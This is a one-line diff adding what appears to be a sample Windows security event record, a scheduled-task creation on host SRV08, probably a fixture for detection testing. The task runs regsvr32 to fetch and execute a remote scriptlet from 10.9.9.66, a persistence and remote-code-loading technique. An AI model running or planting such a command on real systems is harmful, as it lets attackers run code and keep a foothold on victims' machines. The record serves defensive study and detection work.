@@ -1,0 +1,1 @@
+{"Event": {"System": {"EventID": 4698, "Channel": "Security", "Computer": "SRV08"}, "EventData": {"TaskName": "\\SctLoader", "TaskContent": "<Actions><Exec><Command>regsvr32</Command><Arguments>/s /n /u /i:http://10.9.9.66/a.sct scrobj.dll</Arguments></Exec></Actions>"}}}
